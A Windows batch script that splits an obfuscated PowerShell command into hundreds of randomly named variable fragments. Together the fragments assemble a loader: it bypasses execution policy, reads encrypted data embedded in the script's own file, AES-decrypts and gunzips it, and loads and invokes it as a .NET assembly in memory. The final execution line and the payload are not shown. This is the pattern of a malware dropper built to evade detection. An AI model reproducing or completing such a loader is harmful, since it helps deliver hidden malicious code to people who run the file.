@echo off
set "JAdLhpLEML=rs"
set "JuSHcLYMYB=st"
set "kPuHyrwQAn=Po"
set "WHFacMfcTW=ll"
set "QEiMpSVGDX= /"
set "WaihzgGURW=py"
set "ekfdKkigaL= C"
set "iCssrNITGy=s\"
set "HUlacZlMBr=he"
set "vTsPnVarMG=ow"
set "HUqVWecEZh=1."
set "fpGVeEZtBN=co"
set "WEDmXNKKqF=\W"
set "OVbcIHYxdx=0\"
set "zbaQuTYdBy=:\"
set "FrCmwmKFDE=Wi"
set "PVUfmgKGat=in"
set "zDDwnGYvOA=Sy"
set "qotfOhEXwd=.e"
set "TRynVftcno=xe"
set "IHIEtEwlYC=po"
set "iJWizIwcZE=we"
set "vblsEHPGZI=ws"
set "pExfjNKBAE=rS"
set "goiAnsyfnk=do"
set "mqWMuSqWBG=32"
set "lsTWvUAKno=em"
set "xaQgusBflV=y "
set "xSdEbUkDlT=nd"
set "IRFwhjSLOG=ll"
set "ZEcqobrKdX=we"
set "rdGsirTAbW=he"
set "lMHvtGroxL=\v"
set "TSqZqKbjpK= %~dp0"
set "ZfGpxwtrwJ=cd"
set "zDDdPbibbt='h6b"
set "LEjBtczRJV=  $z"
set "fyofXYmwLQ=Comp"
set "voCGAjruQi=)($K"
set "UdwvNYgvIQ=]::("
set "FOQMsTZaXA=bypa"
set "QKlBiqlIrW=);$E"
set "urlIPUcAuQ=.Dis"
set "ZPuLYhByFe=wX.I"
set "bzHJpyFmkh=$dVj"
set "eNYqUKZCKY=Star"
set "qOvyJcQOoM=$Poe"
set "MkNnnsEvZm=ateD"
set "XWfOmJzTrS=($TC"
set "CLDmWPKmaf=.Cry"
set "bgBwfkqNUe=ress"
set "UAzkIgxpsA=brea"
set "omKFokuPNb=:: '"
set "oybIkmErrl=Fina"
set "YGttqKdill=TCfH"
set "FZFgZTZpHU=y]::"
set "rsHATfKwzt=iOdg"
set "IDTRVDsxbv=sion"
set "LcsqTYcyOq=)))"
set "qGOfekivXh=gMod"
set "jnmTeXoLzo=EKdZ"
set "JzuUrkDxNO=B = "
set "tyBEqcSzOt=S46e"
set "nMzbMolIQn=Secu"
set "cYWKCJztvf=;$eN"
set "gIMGUCQIYN=m.IO"
set "CRKyYCZrhR=);$j"
set "dJubvQrovt=ispo"
set "OvPrzhpFIs= if "
set "xrRKzYqYBU=yste"
set "fXoMWTyFqZ=ing("
set "tWdKsdxQPC=.Cry"
set "VcUqYnzOdt=nirt"
set "UvecidZqof=ionM"
set "DwNKUHbEUY=-Obj"
set "ugoLHJyuJu=saBm"
set "OERWtoCVqe=d;$P"
set "AzXqXaPper=B = "
set "jZIJQDVZsD=ss -"
set "vviHsKYhiD=UBg."
set "TEgOrCpnbX=pose"
set "UwVcCfGTgF=LP.T"
set "rPxcuZJdpR=);$P"
set "dKFyOFXGwp=tion"
set "oSsnsSwVpF=[Sys"
set "oiMuAfEAsd=yste"
set "VoFLLpTViY=Obje"
set "JiPCJVnqqD=ptog"
set "CdAowOxQZq=trea"
set "KneglcYJSp=Ti8L"
set "atcyKEyddP=$KGA"
set "iVuYNYqxxl=znSk"
set "wSOsIioTPK=GATB"
set "EJAgAepONL=Disp"
set "SJWznTPCci= = N"
set "hqjHPkFZUv=e]::"
set "GdqKlWQVYy=X.Pa"
set "hzruynrHnV=ose("
set "ckUNiTLlQe=KGAT"
set "SyolaqNTty=nage"
set "xZrdCVXhyi=oewX"
set "YGpZibqeqQ=('KY"
set "fKJBrXvLor=g = "
set "HRuZIlEctI=mMK4"
set "hAtckfCrGd=TB);"
set "yrXuvctaWO=pres"
set "ICdMJOfVZd=ne);"
set "kzSSsKpwBr=nWBX"
set "dPkuVGUsvZ=am;$"
set "OBeKMrjCAK=t = "
set "UwjenOZvLb=ose("
set "txydhaedbA=ewLi"
set "APrqIHDPsE=$jEZ"
set "qVObDysXzG=.Cre"
set "VEkwKmjgtS=::De"
set "YtIFoHQfMx= '')"
set "PmwhJfNuOl=m(, "
set "OyxAlAksNO=('da"
set "DKqhZWkXcT=lBlo"
set "UGvfJLohtw=$EKd"
set "alglAPeiow=16] "
set "iOAZmehSkU=6] -"
set "YucnPwafVT=$KGA"
set "pBGpzzqfOp=ptor"
set "IMrdSrLdLL=[Sys"
set "ihIIuawEnm=.Cop"
set "zjxKxhwhsf=ert]"
set "EobxFeDJDi=hy.A"
set "WVkmbRqOqn=se()"
set "ARYHKkvitK=ieqa"
set "HCgzUCtFBs=ode]"
set "OJbXunkuTE=McK "
set "ZfCXBBTsbM=ieqa"
set "mfdWYCKzHE=ct S"
set "ONaFYEkxQU=Bmor"
set "SExIbMckyT=.Len"
set "QPlINxScVc=fHI."
set "KCgSAsUwcs=I.Su"
set "eeKmlCQZNF=oryS"
set "IJcQanqUCw=.Ass"
set "ErMTdIVRQl=7;$P"
set "EcBSofYpJO=le  "
set "vbDwuYousl=ew-O"
set "XCoiPyAfHt=nTMc"
set "QPsNOAozDX=;$nW"
set "doSGpYunpd=Syst"
set "kTeMDKaDNk=)) {"
set "lFcyYGKSwM=oL'["
set "LotFFWdKMm=null"
set "ReqdisqPFl== [S"
set "vimPsxuqcn=TB ="
set "OVqjmVoSmy=..-1"
set "mhEQcZysuW=yTo("
set "TpawAmdSPY=tem."
set "DojArzgNXL=bjec"
set "xIbqBEpHSj=File"
set "mOoQZARDkM=Stre"
set "aZbWDGCtPr=K.En"
set "PsCioOItdt=raph"
set "GAATIYYCWE=Poew"
set "XGCSyVZltI=b6t6"
set "lvRDglsdjC=tS46"
set "CDsWjBkqtq=ypto"
set "vgVuQFxvEM='txe"
set "BqiVCEzwiO=.Sec"
set "nyHHLJkZVX=BC;$"
set "QwPquIcDhi=Gc);"
set "BOvnYiaysl=comm"
set "ErMYgsXFSh=).Sp"
set "uPOGJoErWu=tem."
set "WyJBLuMmqg= '')"
set "HKSGgMotVH=k; }"
set "WrCaFXnRJL=gth)"
set "wuxHeKHZbP=ddin"
set "PNpJgNDzCS=oewX"
set "NbErrcPHBX=urit"
set "zlWosjQFYT=New-"
set "slsfWcMAjH=oint"
set "AYVlCenQuX=F'[-"
set "gxtAlqOhaw=O.Me"
set "fXsjEFPMvf=$tuc"
set "NXNxZgistU=);$e"
set "NBfUDIDpPq=PKCS"
set "ObuAZhfIxo='gni"
set "YBNkzptzHV=oewX"
set "jWbjVfaPwp=.Mod"
set "WnEXwdPyyp=oArr"
set "JsHMHZaOtF=2Q+X"
set "zhGjzDClxJ=form"
set "YVxopAQAdy=157K"
set "QReDUpOFTy='[-1"
set "MPkAtLvaZG=9tpc"
set "xgOIUDLoSu=tsWi"
set "gqxdMjiWvP=[Sys"
set "ufgrOoUrEe== $P"
set "YViFiyZcBD=ress"
set "mDFbGelXUx=]::N"
set "WWRXsdEtXA=();$"
set "pOiIYNjcrI=Syst"
set "lwmXznItVB=stem"
set "YnGZDsIAHZ=em.I"
set "ZrzDKotEiz=n ''"
set "rJpeumQQQX=e = "
set "jVBRkOXBDW= = $"
set "uaMZzCfWnV=Disp"
set "weFcXZvmMv=;$dV"
set "zOXvopteTS=ct S"
set "JKUDmJtlWT=comp"
set "nbnIIPZzAB=-4] "
set "PeeJSXvhNc=] -j"
set "yLTaZeXMkm=$jEZ"
set "RslVUwCRHS=t Sy"
set "eZcVCTGhSg==');"
set "pKXVvFuokJ=y.Pa"
set "vxkCkyPSDF=ecry"
set "sjwlxPAUCw=.Key"
set "QwcvmVuFTQ=jLP "
set "RGjFNaWght=-joi"
set "UAfOeIZAhO=[Env"
set "TpfckaVadu=; };"
set "EaIYfCdDeD=NUBg"
set "xKMNBpOPHx=;$dV"
set "MARadZlPGb='')("
set "IbngGZkhDc=th('"
set "OxCOeMpRuc=ect "
set "sLCycZyOIh=ion."
set "FywlJaFMIW=-ep "
set "OdviHgpyXH=wfBW"
set "OfoJGwBXGh=rans"
set "XnmypRCHao=tem."
set "SxYRJMYBed=esaB"
set "QMuFbPGWaB=Invo"
set "qqsxsRIDCg=$jEZ"
set "UjAsQuWDub=stem"
set "svNIYFuxaH= [Sy"
set "HQJdEtzlKc=;$nT"
set "xqipMxnIIp=Zt.D"
set "JHzaBcNDlW=.Dis"
set "YpYROCllBK=fHI "
set "pGgjohvuuA=oin "
set "fdnymuFBlS=raph"
set "SXYPCGMvUA=1] -"
set "kOoWuQlOzu=and "
set "xZALhrMHzV='[-1"
set "QOQyythapQ=.Com"
set "mfStcdZObr=z = "
set "iPLkfmUYDU=eam("
set "WHFcINQMDY=ck($"
set "ibpuEEuLBM=onve"
set "gOTkgNLwaS=tucT"
set "FWdwTQdsnl=EZGc"
set "RjFvEOQyjC=B, 0"
